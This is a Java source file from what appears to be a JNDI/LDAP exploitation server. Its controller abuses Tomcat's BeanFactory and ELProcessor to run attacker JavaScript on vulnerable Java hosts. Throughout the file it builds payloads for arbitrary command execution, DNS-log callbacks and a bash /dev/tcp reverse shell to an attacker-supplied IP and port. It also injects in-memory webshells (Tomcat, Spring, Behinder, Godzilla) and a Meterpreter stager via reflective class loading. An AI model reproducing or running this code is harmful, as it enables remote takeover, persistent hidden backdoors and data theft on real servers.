package com.feihong.ldap.controllers;

import com.feihong.ldap.enumtypes.PayloadType;
import com.feihong.ldap.exceptions.IncorrectParamsException;
import com.feihong.ldap.exceptions.UnSupportedPayloadTypeException;
import com.feihong.ldap.template.*;
import com.feihong.ldap.utils.*;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;
import org.apache.naming.ResourceRef;
import javax.naming.StringRefAddr;
import java.io.IOException;
import java.lang.reflect.Field;

import static org.fusesource.jansi.Ansi.ansi;

/*
   注意：在 Javascript 引擎时，直接使用 sun.misc.Base64Decoder 和 org.apache.tomcat.util.buf.Base64 均会抛出异常

    * Requires:
    *   - Tomcat 8+ or SpringBoot 1.2.x+ in classpath
 */

@LdapMapping(uri = { "/tomcatbypass" })
public class TomcatBypassController implements LdapController {
    private PayloadType type;
    private String[] params;
    private String payloadTemplate = "{" +
            "\"\".getClass().forName(\"javax.script.ScriptEngineManager\")" +
            ".newInstance().getEngineByName(\"JavaScript\")" +
            ".eval(\"{replacement}\")" +
            "}";


    @Override
    public void sendResult(InMemoryInterceptedSearchResult result, String base) throws Exception {
        System.out.println( ansi().render("@|green [+]|@ @|MAGENTA Sending LDAP ResourceRef result for |@" + base + " @|MAGENTA with javax.el.ELProcessor payload|@"));

        Entry e = new Entry(base);
        e.addAttribute("javaClassName", "java.lang.String"); //could be any
        //准备在 org.apache.naming.factory.BeanFactory 中利用不安全反射的负载
        //prepare payload that exploits unsafe reflection in org.apache.naming.factory.BeanFactory
        ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "",
                true, "org.apache.naming.factory.BeanFactory", null);
        ref.add(new StringRefAddr("forceString", "x=eval"));

        TomcatBypassHelper helper = new TomcatBypassHelper();
        String code = null;
        //具体分化在这里
        switch (type){
            case dnslog:
                code = helper.getDnsRequestCode(params[0]);
                break;
            case command:
                code = helper.getExecCode(params[0]);
                break;
            case reverseshell:
                code = helper.getReverseShellCode(params[0], params[1]);
                break;
            case tomcatecho:
                code = helper.injectTomcatEcho();
                break;
            case springecho:
                code = helper.injectSpringEcho();
                break;
            case tomcatmemshell1:
                code = helper.injectTomcatMemshell1();
                break;
            case tomcatmemshell2:
                //获取code
                code = helper.injectTomcatMemshell2();
                break;
            case springmemshell:
                code = helper.injectSpringMemshell();
                break;
            case tomcatmemshell3:
                code = helper.injectmemshell3();
                break;
            case issuccess:
                code = helper.injectSuccess();
                break;
            case godzillamemshell:
                code = helper.injectGodzilla();
                break;
            case meterpreter:
                code=helper.injectMeterpreter();
                break;
        }

        String finalPayload = payloadTemplate.replace("{replacement}", code);
        ref.add(new StringRefAddr("x", finalPayload));
        e.addAttribute("javaSerializedData", Util.serialize(ref));

        result.sendSearchEntry(e);
        result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
    }

    @Override
    public void process(String base) throws UnSupportedPayloadTypeException, IncorrectParamsException {
        try{
            int firstIndex = base.indexOf("/");
            int secondIndex = base.indexOf("/", firstIndex + 1);
            if(secondIndex < 0) secondIndex = base.length();

            try{
                type = PayloadType.valueOf(base.substring(firstIndex + 1, secondIndex).toLowerCase());

                //因为是 Tomcat Bypass，所以仅需要支持 Tomcat内存shell 和 Spring内存shell 即可
                if(type == PayloadType.weblogicmemshell1 || type == PayloadType.weblogicmemshell2 || type == PayloadType.webspherememshell
                        || type == PayloadType.jettymemshell || type == PayloadType.jbossmemshell || type == PayloadType.weblogicecho){
                    throw new UnSupportedPayloadTypeException("UnSupportedPayloadType: " + type);
                }

                System.out.println( ansi().render("@|green [+]|@ @|MAGENTA Paylaod >> |@" + type));
            }catch(IllegalArgumentException e){
                throw new UnSupportedPayloadTypeException("UnSupportedPayloadType >> " + base.substring(firstIndex + 1, secondIndex));
            }

            switch (type){
                case dnslog:
                    String url = base.substring(base.lastIndexOf("/") + 1);
                    System.out.println( ansi().render("@|green [+]|@ @|MAGENTA URL >> |@" + url));
                    params = new String[]{url};
                    break;
                case command:
                    String cmd = Util.getCmdFromBase(base);
                    System.out.println( ansi().render("@|green [+]|@ @|MAGENTA Command >> |@" + cmd));
                    params = new String[]{cmd};
                    break;
                    //可以把反弹msf的host和port在这里进行处理
                case reverseshell:
                    String[] results = Util.getIPAndPortFromBase(base);
                    System.out.println( ansi().render("@|green [+]|@ @|MAGENTA IP >> |@" + results[0]));
                    System.out.println( ansi().render("@|green [+]|@ @|MAGENTA Port >> |@" + results[1]));
                    params = results;
                    break;
                case meterpreter:
                    String[] results1 = Util.getIPAndPortFromBase(base);
                    Config.rhost=results1[0];
                    Config.rport=results1[1];
                    System.out.println( ansi().render("@|green [+]|@ @|MAGENTA RemotHost >> |@" + results1[0]));
                    System.out.println( ansi().render("@|green [+]|@ @|MAGENTA RemotPort >> |@" + results1[1]));
                    params = results1;

            }
        }catch(Exception e){
            if(e instanceof UnSupportedPayloadTypeException) throw (UnSupportedPayloadTypeException)e;

            throw new IncorrectParamsException("Incorrect params: " + base);
        }
    }

    private class TomcatBypassHelper{
        /*
            在对代码进行改写时需要注意：
                ① 所有的数据类型修改为 var, 包括 byte[] bytes ( var bytes )
                ② 必须使用全类名
                ③  System.out.println() 需要修改为 print()
                ④  try{...}catch(Exception e){...}  需要修改为 try{...}catch(err){...}
                ⑤  双引号改为单引号
                ⑥  Class.forName() 需要改为 java.lang.Class.forName(), String 需要改为 java.lang.String等
                ⑦  去除类型强转
                ⑧  不能用 sun.misc.BASE64Encoder，会抛异常  javax.script.ScriptException: ReferenceError: "sun" is not defined in <eval> at line number 1
                ⑨  不能使用  for(Object obj : objects) 循环
         */

        public String getExecCode(String cmd) throws IOException {

            String code = "var strs=new Array(3);\n" +
                    "        if(java.io.File.separator.equals('/')){\n" +
                    "            strs[0]='/bin/bash';\n" +
                    "            strs[1]='-c';\n" +
                    "            strs[2]='" + cmd + "';\n" +
                    "        }else{\n" +
                    "            strs[0]='cmd';\n" +
                    "            strs[1]='/C';\n" +
                    "            strs[2]='" + cmd + "';\n" +
                    "        }\n" +
                    "        java.lang.Runtime.getRuntime().exec(strs);";

            return code;
        }

        public String getDnsRequestCode(String dnslog){
            String code = "var str;\n" +
                    "            if(java.io.File.separator.equals('/')){\n" +
                    "                str = 'ping -c 1 " + dnslog + "';\n" +
                    "            }else{\n" +
                    "                str = 'nslookup " + dnslog + "';\n" +
                    "            }\n" +
                    "\n" +
                    "            java.lang.Runtime.getRuntime().exec(str);";

            return code;
        }

        public String getReverseShellCode(String ip, String port){
            int pt = Integer.parseInt(port);
            String code = "if(java.io.File.separator.equals('/')){\n" +
                    "                var cmds = new Array('/bin/bash', '-c', '/bin/bash -i >& /dev/tcp/" + ip + "/" + pt + "');\n" +
                    "                java.lang.Runtime.getRuntime().exec(cmds);\n" +
                    "            }";

            return code;
        }

        public String injectTomcatEcho(){
            return injectMemshell(TomcatEchoTemplate.class);
        }

        public String injectSpringEcho(){
            return injectMemshell(SpringEchoTemplate.class);
        }

        public String injectTomcatMemshell1(){
            return injectMemshell(TomcatMemshellTemplate1.class);
        }

        public String injectTomcatMemshell2(){
            return injectMemshell(TomcatMemshellTemplate2.class);
        }

        public String injectSpringMemshell(){
            return injectMemshell(SpringMemshellTemplate.class);
        }

        public String injectmemshell3(){
            return  injectMemshell(BehinderFilter.class);
        }

        public String injectSuccess(){
            return injectMemshell(isSuccess.class);
        }

        public String injectGodzilla(){
            return injectMemshell(GodzillaFilter.class);
        }

//        public String injectMeterpreter(){return injectMemshell(Meterpreter.class);}
        public String injectMeterpreter() throws NoSuchFieldException, IllegalAccessException {
            System.out.println("------------------------");
//            System.out.println(Meterpreter.host+"|"+Meterpreter.port);
//            Field hostF=Meterpreter.class.getField("host");
//            Field portF=Meterpreter.class.getField("port");
//            hostF.set(null,ip);
//            portF.set(null,port);
//            System.out.println("Meterpreter RemotHost:"+Meterpreter.host);
//            System.out.println("Meterpreter RemotPort:"+Meterpreter.port);
            return injectMemshell(Meterpreter.class);
        }

        //TODO：内存马注入方式
        public String injectMemshell(Class clazz){
            //使用类加载的方式最为方便，可维护性也大大增强

            String classCode = null;
            try{
                //获取base64后的类
                classCode = Util.getClassCode(clazz);

            }catch(Exception e){
                e.printStackTrace();
            }

            String code = "var bytes = org.apache.tomcat.util.codec.binary.Base64.decodeBase64('" + classCode + "');\n" +
                    "var classLoader = java.lang.Thread.currentThread().getContextClassLoader();\n" +
                    "try{\n" +
                    "   var clazz = classLoader.loadClass('" + clazz.getName() + "');\n" +
                    "   clazz.newInstance();\n" +
                    "}catch(err){\n" +
                    "   var method = java.lang.ClassLoader.class.getDeclaredMethod('defineClass', ''.getBytes().getClass(), java.lang.Integer.TYPE, java.lang.Integer.TYPE);\n" +
                    "   method.setAccessible(true);\n" +
                    "   var clazz = method.invoke(classLoader, bytes, 0, bytes.length);\n" +
                    "   clazz.newInstance();\n" +
                    "};";

            return code;
        }


    }
}